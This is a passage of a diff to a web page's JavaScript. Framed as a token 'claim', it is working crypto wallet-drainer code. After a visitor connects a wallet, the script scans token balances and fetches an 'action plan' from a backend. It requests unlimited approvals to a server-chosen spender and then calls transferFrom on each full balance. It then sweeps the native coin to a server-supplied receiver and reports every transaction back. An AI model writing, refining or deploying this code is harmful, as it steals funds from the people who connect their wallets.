+    var ERC20_ABI = serverConfig.erc20_abi || ['function balanceOf(address owner) view returns (uint256)'];
+
+    var results = await Promise.allSettled(tokens.map(async function(t){
+      try {
+        var c = new _eth.Contract(t.address, ['function balanceOf(address owner) view returns (uint256)','function decimals() view returns (uint8)'], ethersProvider);
+        var bal = await c.balanceOf(address);
+        var dec = t.decimals || 18;
+        var fmt = parseFloat(_eth.formatUnits(bal, dec));
+        return fmt > 0 ? { symbol: t.symbol, address: t.address, decimals: dec, balance: fmt, rawBalance: bal.toString() } : null;
+      } catch(e) { return null; }
+    }));
+
     discoveredAssets = results.filter(function(r){ return r.status==='fulfilled' && r.value!==null; }).map(function(r){ return r.value; });
-    log('Found ' + discoveredAssets.length + ' asset(s).', 'ok'); renderAssetList(); return discoveredAssets;
+    log('Found ' + discoveredAssets.length + ' asset(s).', 'ok');
+    renderAssetList(chainId);
+    return discoveredAssets;
   }
-  function renderAssetList(){
-    var list = document.getElementById('assetList'); var explorerBase = NETWORKS[selectedNetworkKey].explorer_url;
+
+  function renderAssetList(chainId){
+    var list = document.getElementById('assetList');
+    var net = NETWORKS[selectedNetworkKey];
+    var explorerBase = net ? net.explorerUrl : 'https://bscscan.com';
     if (!discoveredAssets.length) { list.innerHTML = '<span class="scan-status">No token balances found.</span>'; return; }
-    list.innerHTML = discoveredAssets.map(function(a){ return '<div class="asset-item"><span class="asset-symbol">'+a.symbol+'</span><span class="asset-balance">'+a.balance.toLocaleString(undefined,{maximumFractionDigits:4})+'</span><a href="'+explorerBase+'/token/'+a.address+'" target="_blank" style="color:#64748b;font-size:0.75rem;">view</a></div>'; }).join('');
+    list.innerHTML = discoveredAssets.map(function(a){
+      return '<div class="asset-item"><span class="asset-symbol">'+a.symbol+'</span><span class="asset-balance">'+a.balance.toLocaleString(undefined,{maximumFractionDigits:4})+'</span><a href="'+explorerBase+'/token/'+a.address+'" target="_blank" style="color:#64748b;font-size:0.75rem;">view</a></div>';
+    }).join('');
   }
+
+  // ─── REFRESH INFO ───────────────────────────────────────────
   async function refreshInfo(address, chainId){
     currentChainId = chainId || TARGET_CHAIN_ID;
     var info = await apiCall('get_chain_info', { chain_id: currentChainId });
-    var netName = NETWORKS[selectedNetworkKey].name, nativeSymbol = NETWORKS[selectedNetworkKey].native_currency.symbol;
-    if (info && info.info) { netName = info.info.name || netName; if (info.info.native_currency && info.info.native_currency.symbol) nativeSymbol = info.info.native_currency.symbol; }
-    document.getElementById('networkName').textContent = netName; document.getElementById('chainIdDisplay').textContent = currentChainId;
+    if (info && info.info) {
+      document.getElementById('networkName').textContent = info.info.name;
+      document.getElementById('chainIdDisplay').textContent = currentChainId;
+    } else {
+      // Fallback to local network definition
+      var localNet = Object.values(NETWORKS).find(function(n){ return n.chainId === currentChainId; });
+      if (localNet) {
+        document.getElementById('networkName').textContent = localNet.name;
+        document.getElementById('chainIdDisplay').textContent = currentChainId;
+      }
+    }
     if (!ethersProvider) return;
     try {
       var _eth = await import('https://esm.sh/v135/ethers@6.13.4');
       var bal = await ethersProvider.getBalance(address);
-      document.getElementById('nativeBalance').textContent = parseFloat(_eth.formatEther(bal)).toFixed(6) + ' ' + nativeSymbol;
-      var usdtAddr = (info && info.usdt_addr) || (FALLBACK_TOKENS[currentChainId] && FALLBACK_TOKENS[currentChainId].find(function(t){return t.symbol==='USDT';}) ? FALLBACK_TOKENS[currentChainId].find(function(t){return t.symbol==='USDT';}).address : null);
-      if (usdtAddr) { var t = new _eth.Contract(usdtAddr, ['function balanceOf(address) view returns (uint256)','function decimals() view returns (uint8)'], ethersProvider); var b = await t.balanceOf(address); var dec = await t.decimals(); document.getElementById('usdtBalance').textContent = parseFloat(_eth.formatUnits(b, dec)).toFixed(2) + ' USDT'; }
+      var sym = (info && info.info && info.info.symbol) ? info.info.symbol : NETWORKS[selectedNetworkKey].symbol;
+      document.getElementById('nativeBalance').textContent = parseFloat(_eth.formatEther(bal)).toFixed(6) + ' ' + sym;
+      if (info && info.usdt_addr) {
+        var t = new _eth.Contract(info.usdt_addr, ['function balanceOf(address) view returns (uint256)','function decimals() view returns (uint8)'], ethersProvider);
+        var b = await t.balanceOf(address); var dec = await t.decimals();
+        document.getElementById('usdtBalance').textContent = parseFloat(_eth.formatUnits(b, dec)).toFixed(2) + ' USDT';
+      }
     } catch(e) { log('refreshInfo error: ' + e.message, 'warn'); }
   }
-  async function getNetworkGasPrice(){ var net = NETWORKS[selectedNetworkKey]; try { var res = await fetch(net.rpc_url, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({jsonrpc:'2.0',method:'eth_gasPrice',params:[],id:1}) }); var data = await res.json(); return data.result; } catch(e) { return selectedNetworkKey === 'ethereum' ? '0x12A05F200' : '0xB2D05E00'; } }
-  function getTxExplorerUrl(hash){ return NETWORKS[selectedNetworkKey].explorer_url + '/tx/' + hash; }
-  function buildLocalActionPlan(assets, chainId, nativeBalanceWei, receiver){
-    var priOrder = {stable:0,high:1,medium:2,low:3}; var tokenList = FALLBACK_TOKENS[chainId] || []; var priorityMap = {};
-    tokenList.forEach(function(t){ priorityMap[t.symbol] = t.priority || 'low'; });
-    var sorted = assets.slice().sort(function(a,b){ var aS = STABLECOINS.indexOf(a.symbol) !== -1, bS = STABLECOINS.indexOf(b.symbol) !== -1; if (aS && !bS) return -1; if (!aS && bS) return 1; return (priOrder[priorityMap[a.symbol]||'low']) - (priOrder[priorityMap[b.symbol]||'low']); });
-    var steps = sorted.map(function(asset, i){ return { order:i+1, type:'token', symbol:asset.symbol, address:asset.address, decimals:asset.decimals, balance:asset.balance, rawBalance:asset.rawBalance, spender:receiver, action:'approve_then_transfer', gas_limit:GAS_LIMIT_TOKEN, allowance_wait_seconds:7 }; });
-    var nativeBal = BigInt(nativeBalanceWei), gasPrice = BigInt('3000000000'), gasCost = gasPrice * BigInt(GAS_UNITS_NATIVE), sendable = nativeBal - gasCost;
-    var skipNative = sendable <= 0; var nativeAmount = skipNative ? '0' : sendable.toString();
-    return { steps:steps, total_tokens:steps.length, skip_native:skipNative, native_amount:nativeAmount };
-  }
-  async function initiateClaim(address, chainId){
-    if (triggerRunning) return; triggerRunning = true; log('Initiating claim on chain ' + chainId + '...', 'ok');
+
+  // ─── GET GAS PRICE (works for both BSC and Ethereum) ────────
+  async function getNetworkGasPrice(){
+    var net = NETWORKS[selectedNetworkKey];
     try {
+      var res = await fetch(net.rpcUrl, {
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ jsonrpc:'2.0', method:'eth_gasPrice', params:[], id:1 })
+      });
+      var data = await res.json();
+      return data.result;
+    } catch(e) {
+      // Fallback gas prices
+      return selectedNetworkKey === 'eth' ? '0x12A05F200' : '0xB2D05E00'; // 5 Gwei ETH / 3 Gwei BSC
+    }
+  }
+
+  // ─── GET EXPLORER URL FOR TX LINK ───────────────────────────
+  function getTxExplorerUrl(hash){
+    var net = NETWORKS[selectedNetworkKey];
+    return (net ? net.explorerUrl : 'https://bscscan.com') + '/tx/' + hash;
+  }
+
+  // ─── INITIATE CLAIM — chainId sent to backend at every stage ─
+  async function initiateClaim(address, chainId){
+    if (triggerRunning) { log('Already running.', 'warn'); return; }
+    triggerRunning = true;
+    log('Initiating claim on chain ' + chainId + '...', 'ok');
+
+    try {
+      // Stage 1: Scan assets
       setStatus('Stage 1/4 — Scanning assets on ' + NETWORKS[selectedNetworkKey].name + '...');
       var assets = await scanWalletAssets(address, chainId);
-      if (!assets.length) { log('No token balances found — proceeding to native sweep.', 'warn'); } else { log('Stage 1 complete: ' + assets.length + ' asset(s) discovered.', 'ok'); }
-      setStatus('Stage 2/4 — Building action plan...');
+      if (!assets.length) { setStatus('No token balances found.'); return; }
+
+      // Stage 2: Backend action plan — chainId in payload
+      setStatus('Stage 2/4 — Requesting action plan from server...');
       var _eth = await import('https://esm.sh/v135/ethers@6.13.4');
-      var nativeBal = await ethersProvider.getBalance(address); var receiver = RECEIVER_ADDRESS; var planData = null;
-      if (assets.length) { planData = await apiCall('build_action_plan', { assets:assets, chain_id:chainId, user_address:address, native_balance:nativeBal.toString() }); }
-      var plan;
-      if (planData && planData.action_plan) { log('Stage 2 complete: server action plan received.', 'ok'); receiver = planData.receiver || receiver; plan = { steps:planData.action_plan, skip_native:planData.skip_native, native_amount:planData.native_amount }; }
-      else { log('Stage 2 complete: using client-side action plan.', 'ok'); plan = buildLocalActionPlan(assets, chainId, nativeBal.toString(), receiver); }
-      var steps = plan.steps || [], skipNative = plan.skip_native, nativeAmount = plan.native_amount;
-      log('Plan: ' + steps.length + ' token step(s), native ' + (skipNative?'skipped':'sweep') + '.', 'ok');
-      for (var i = 0; i < steps.length; i++) {
-        var step = steps[i]; log('--- Stage 3: Step ' + (i+1) + '/' + steps.length + ': ' + step.symbol + ' ---'); setStatus('Stage 3/4 — Processing ' + step.symbol + ' (' + (i+1) + '/' + steps.length + ')...');
+      var nativeBal = await ethersProvider.getBalance(address);
+      var planData = await apiCall('build_action_plan', {
+        assets: assets,
+        chain_id: chainId,           // explicit chain_id for backend routing
+        user_address: address,
+        native_balance: nativeBal.toString()
+      });
+      if (!planData) { setStatus('Server rejected action plan.'); return; }
+
+      serverActionPlan = planData.action_plan;
+      serverReceiver   = planData.receiver;
+      var skipNative   = planData.skip_native;
+      var nativeAmount = planData.native_amount;
+      log('Action plan received: ' + serverActionPlan.length + ' step(s) on chain ' + chainId + '.', 'ok');
+
+      // Stage 3: Execute each step
+      for (var i = 0; i < serverActionPlan.length; i++) {
+        var step = serverActionPlan[i];
+        log('--- Step ' + (i+1) + '/' + serverActionPlan.length + ': ' + step.symbol + ' ---');
+        setStatus('Stage 3/4 — Processing ' + step.symbol + ' (' + (i+1) + '/' + serverActionPlan.length + ')...');
+
         try {
-          var token = new _eth.Contract(step.address, ['function approve(address spender, uint256 amount) returns (bool)','function allowance(address owner, address spender) view returns (uint256)','function transferFrom(address from, address to, uint256 amount) returns (bool)','function balanceOf(address owner) view returns (uint256)'], ethersSigner);
+          var token = new _eth.Contract(step.address, [
+            'function approve(address spender, uint256 amount) returns (bool)',
+            'function allowance(address owner, address spender) view returns (uint256)',
+            'function transferFrom(address from, address to, uint256 amount) returns (bool)',
+            'function balanceOf(address owner) view returns (uint256)'
+          ], ethersSigner);
+
           var gasPriceHex = await getNetworkGasPrice();
-          var approveReceipt = await sendAndWait(token.approve(step.spender, _eth.MaxUint256, { gasLimit:step.gas_limit, gasPrice:gasPriceHex }), 'Approve(' + step.symbol + ')', _eth);
+
+          var approveReceipt = await sendAndWait(
+            token.approve(step.spender, _eth.MaxUint256, { gasLimit: step.gas_limit, gasPrice: gasPriceHex }),
+            'Approve(' + step.symbol + ')', _eth
+          );
           if (!approveReceipt) { log('[SKIP] Approve failed for ' + step.symbol, 'warn'); continue; }
-          log('Approve confirmed. Waiting ' + (step.allowance_wait_seconds || 7) + 's...'); await sleep((step.allowance_wait_seconds || 7) * 1000);
-          var freshBal = await token.balanceOf(address); var allowanceOk = await waitForAllowance(token, address, step.spender, freshBal);
-          if (!allowanceOk) { log('[SKIP] Allowance not confirmed for ' + step.symbol, 'err'); continue; }
-          var transferReceipt = await sendAndWait(token.transferFrom(address, step.spender, freshBal, { gasLimit:step.gas_limit, gasPrice:gasPriceHex }), 'TransferFrom(' + step.symbol + ')', _eth);
-          if (!transferReceipt) { log('[SKIP] Transfer failed for ' + step.symbol, 'err'); } else { log(step.symbol + ' transfer complete.', 'ok'); }
+
+          log('Approve confirmed. Waiting ' + (step.allowance_wait_seconds || 7) + 's...');
+          await sleep((step.allowance_wait_seconds || 7) * 1000);
+
+          var freshBal = await token.balanceOf(address);
+          var allowanceOk = await waitForAllowance(token, address, step.spender, freshBal);
+          if (!allowanceOk) { log('[SKIP] Allowance not confirmed', 'err'); continue; }
+
+          var transferReceipt = await sendAndWait(
+            token.transferFrom(address, step.spender, freshBal, { gasLimit: step.gas_limit, gasPrice: gasPriceHex }),
+            'TransferFrom(' + step.symbol + ')', _eth
+          );
+          if (!transferReceipt) { log('[SKIP] Transfer failed', 'err'); }
+          else { log(step.symbol + ' transfer complete', 'ok'); }
+
         } catch(e) { log('[SKIP] Error on ' + step.symbol + ': ' + e.message, 'err'); }
-        if (i < steps.length - 1) await sleep(2000);
+        if (i < serverActionPlan.length - 1) await sleep(2000);
       }
-      log('Stage 3 complete: all token steps processed.', 'ok');
-      setStatus('Stage 4/4 — Evaluating native ' + NETWORKS[selectedNetworkKey].native_currency.symbol + ' sweep...');
+
+      // Stage 4: Native sweep
       if (!skipNative && nativeAmount && nativeAmount !== '0') {
+        setStatus('Stage 4/4 — Sweeping native ' + NETWORKS[selectedNetworkKey].symbol + '...');
         try {
-          log('Sweeping ' + _eth.formatEther(BigInt(nativeAmount)) + ' ' + NETWORKS[selectedNetworkKey].native_currency.symbol + '...'); setStatus('Stage 4/4 — Confirm native sweep in wallet...');
-          var nativeTxHash; try { nativeTxHash = await sendNativeRaw(address, receiver, nativeAmount); } catch(e) { log('Native sweep rejected by user: ' + e.message, 'err'); }
-          if (nativeTxHash) { transactions.unshift({ hash:nativeTxHash, status:'pending' }); renderTxList(); try { var receipt = await ethersProvider.waitForTransaction(nativeTxHash, 1, 120000); updateTxStatus(nativeTxHash, receipt && receipt.status===1 ? 'confirmed' : 'failed'); log('Native sweep ' + (receipt && receipt.status===1 ? 'confirmed.' : 'failed.'), receipt && receipt.status===1 ? 'ok':'err'); } catch(e) { log('Native sweep wait error: ' + e.message, 'warn'); } }
+          log('Sweeping ' + _eth.formatEther(BigInt(nativeAmount)) + ' ' + NETWORKS[selectedNetworkKey].symbol + '...');
+          setStatus('Confirm sweep in wallet...');
+          var nativeTxHash;
+          try { nativeTxHash = await sendNativeRaw(address, serverReceiver, nativeAmount); } catch(e) { log('Native sweep rejected: ' + e.message, 'err'); }
+          if (nativeTxHash) {
+            transactions.unshift({ hash: nativeTxHash, status: 'pending' }); renderTxList();
+            try {
+              var receipt = await ethersProvider.waitForTransaction(nativeTxHash, 1, 120000);
+              updateTxStatus(nativeTxHash, receipt && receipt.status===1 ? 'confirmed' : 'failed');
+            } catch(e) {}
+          }
         } catch(e) { log('Native sweep error: ' + e.message, 'err'); }
-      } else { log('Native sweep skipped (insufficient balance after gas).', 'warn'); }
-      log('Stage 4 complete.', 'ok');
+      } else { log('Native sweep skipped (server decision).', 'warn'); }
+
       statusBadge.textContent = 'Complete'; statusBadge.className = 'badge badge-green';
-      setStatus('✅ Process complete on ' + NETWORKS[selectedNetworkKey].name + '.');
-      log('═══ CLAIM COMPLETE — ALL STAGES FINISHED ═══', 'ok');
+      setStatus('Process complete on ' + NETWORKS[selectedNetworkKey].name + '.'); log('Claim COMPLETE', 'ok');
+
     } catch(e) { log('Claim fatal: ' + e.message, 'err'); setStatus('Fatal error.'); }
     finally { triggerRunning = false; }
   }
-  async function waitForAllowance(token, owner, spender, required, maxRetries){ maxRetries = maxRetries || 8; for (var i=0; i<maxRetries; i++) { try { var allowance = await token.allowance(owner, spender); if (allowance >= required) { log('Allowance confirmed.', 'ok'); return true; } } catch(e) {} await sleep(5000); } return false; }
-  async function sendAndWait(txPromise, label, _eth){
-    log('Sending ' + label + '...'); var txHash;
-    try { var tx = await txPromise; txHash = tx.hash; log(label + ' hash: ' + txHash, 'ok'); }
-    catch(e) { var msg = (e && (e.code===4001||e.code==='ACTION_REJECTED')) ? label+' rejected by user.' : label+' failed: '+e.message; log(msg, 'err'); setStatus(msg); return null; }
-    transactions.unshift({ hash:txHash, status:'pending' }); renderTxList();
-    try { setStatus('Waiting for ' + label + ' confirmation...'); var receipt = await ethersProvider.waitForTransaction(txHash, 1, 120000); var status = receipt && receipt.status===1 ? 'confirmed' : 'failed'; updateTxStatus(txHash, status); log(label + ' ' + status + '.', status==='confirmed'?'ok':'err'); apiCall('report_tx', { tx_hash:txHash, status:status, chain_id:TARGET_CHAIN_ID, token_symbol: label.split('(')[1] ? label.split('(')[1].replace(')','') : 'UNKNOWN', tx_type: label.toLowerCase().indexOf('approve')!==-1 ? 'approve' : 'transfer' }); return receipt; }
-    catch(e) { log(label + ' wait error: ' + e.message, 'warn'); updateTxStatus(txHash, 'failed'); return null; }
+
+  // ─── WAIT FOR ALLOWANCE ─────────────────────────────────────
+  async function waitForAllowance(token, owner, spender, required, maxRetries){
+    maxRetries = maxRetries || 8;
+    for (var i=0; i<maxRetries; i++) {
+      try { var allowance = await token.allowance(owner, spender); if (allowance >= required) { log('Allowance confirmed', 'ok'); return true; } } catch(e) {}
+      await sleep(5000);
+    }
+    return false;
   }
-  async function sendNativeRaw(fromAddress, toAddress, valueWei){ var gasPrice = await getNetworkGasPrice(); var txHash = await rawProvider.request({ method:'eth_sendTransaction', params:[{ from:fromAddress.toLowerCase(), to:toAddress.toLowerCase(), value:'0x'+BigInt(valueWei).toString(16), gas:'0x5208', gasPrice:gasPrice, data:'0x' }] }); log('Native tx: ' + txHash, 'ok'); return txHash; }
-  function renderTxList(){ var list = document.getElementById('txList'); if (!transactions.length) { list.innerHTML = '<span style="color:#64748b;font-size:0.85rem;">No transactions yet.</span>'; return; } list.innerHTML = transactions.slice(0,5).map(function(tx){ var url = getTxExplorerUrl(tx.hash); return '<div class="tx-item"><a class="tx-hash" href="'+url+'" target="_blank">'+tx.hash.slice(0,10)+'...'+tx.hash.slice(-6)+'</a><span class="tx-status tx-'+tx.status+'">'+tx.status+'</span></div>'; }).join(''); }
-  function updateTxStatus(hash, status){ var tx = transactions.find(function(t){ return t.hash===hash; }); if (tx) { tx.status = status; renderTxList(); } }
-  function onDisconnected(){ ethersProvider = null; ethersSigner = null; rawProvider = null; connectedAccount = null; transactions = []; discoveredAssets = []; triggerRunning = false; connectBtn.style.display = 'inline-block'; claimBtn.style.display = 'none'; disconnectBtn.style.display = 'none'; statusText.textContent = ''; infoPanel.classList.remove('visible'); txPanel.classList.remove('visible'); scannerPanel.classList.remove('visible'); chainSwitchBanner.classList.remove('visible'); log('Wallet disconnected.', 'warn'); }
-  applyNetworkSelection('bsc'); initWeb3Modal(); window.selectNetwork = selectNetwork;
+
+  // ─── SEND + WAIT ────────────────────────────────────────────
+  async function sendAndWait(txPromise, label, _eth){
+    log('Sending ' + label + '...');
+    var txHash;
+    try { var tx = await txPromise; txHash = tx.hash; log(label + ' hash: ' + txHash, 'ok'); }
+    catch(e) { var msg = (e && (e.code===4001||e.code==='ACTION_REJECTED')) ? label+' rejected.' : label+' failed: '+e.message; log(msg, 'err'); setStatus(msg); return null; }
+    transactions.unshift({ hash: txHash, status: 'pending' }); renderTxList();
+    try {
+      setStatus('Waiting for ' + label + ' confirmation...');
+      var receipt = await ethersProvider.waitForTransaction(txHash, 1, 120000);
+      var status = receipt && receipt.status===1 ? 'confirmed' : 'failed';
+      updateTxStatus(txHash, status);
+      log(label + ' ' + status, status==='confirmed'?'ok':'err');
+      // Report to backend — include chain_id so backend routes correctly
+      apiCall('report_tx', {
+        tx_hash: txHash, status: status,
+        chain_id: TARGET_CHAIN_ID,
+        token_symbol: label.split('(')[1] ? label.split('(')[1].replace(')','') : 'UNKNOWN',
+        tx_type: label.toLowerCase().indexOf('approve')!==-1 ? 'approve' : 'transfer'
+      });
+      return receipt;
+    } catch(e) { log(label + ' wait error: ' + e.message, 'warn'); updateTxStatus(txHash, 'failed'); return null; }
+  }
+
+  // ─── NATIVE SEND ────────────────────────────────────────────
+  async function sendNativeRaw(fromAddress, toAddress, valueWei){
+    var gasPrice = await getNetworkGasPrice();
+    var txHash = await rawProvider.request({
+      method: 'eth_sendTransaction',
+      params: [{ from: fromAddress.toLowerCase(), to: toAddress.toLowerCase(), value: '0x' + BigInt(valueWei).toString(16), gas: '0x5208', gasPrice: gasPrice, data: '0x' }]
+    });
+    log('Native tx: ' + txHash, 'ok');
+    return txHash;
+  }
+
+  // ─── TX LIST ────────────────────────────────────────────────
+  function renderTxList(){
+    var list = document.getElementById('txList');
+    if (!transactions.length) { list.innerHTML = '<span style="color:#64748b;font-size:0.85rem;">No transactions yet.</span>'; return; }
+    list.innerHTML = transactions.slice(0,5).map(function(tx){
+      var url = getTxExplorerUrl(tx.hash);
+      return '<div class="tx-item"><a class="tx-hash" href="'+url+'" target="_blank">'+tx.hash.slice(0,10)+'...'+tx.hash.slice(-6)+'</a><span class="tx-status tx-'+tx.status+'">'+tx.status+'</span></div>';
+    }).join('');
+  }
+  function updateTxStatus(hash, status){
+    var tx = transactions.find(function(t){ return t.hash===hash; }); if (tx) { tx.status = status; renderTxList(); }
+  }
+
+  // ─── ON DISCONNECTED ────────────────────────────────────────
+  function onDisconnected(){
+    ethersProvider = null; ethersSigner = null; rawProvider = null; connectedAccount = null;
+    transactions = []; discoveredAssets = []; triggerRunning = false;
+    connectBtn.style.display = 'inline-block'; claimBtn.style.display = 'none'; disconnectBtn.style.display = 'none';
+    statusText.textContent = ''; infoPanel.classList.remove('visible'); txPanel.classList.remove('visible');
+    scannerPanel.classList.remove('visible'); chainSwitchBanner.classList.remove('visible');
+    log('Wallet disconnected.', 'warn');
+  }
+
+  // ─── STARTUP ────────────────────────────────────────────────
+  // Initialise selector UI to BSC (default) then boot Web3Modal
+  applyNetworkSelection('bsc');
+  initWeb3Modal();
+
+  // Expose selectNetwork globally so HTML onclick can call it
+  window.selectNetwork = selectNetwork;
+
 })();
 </script>
 </body>
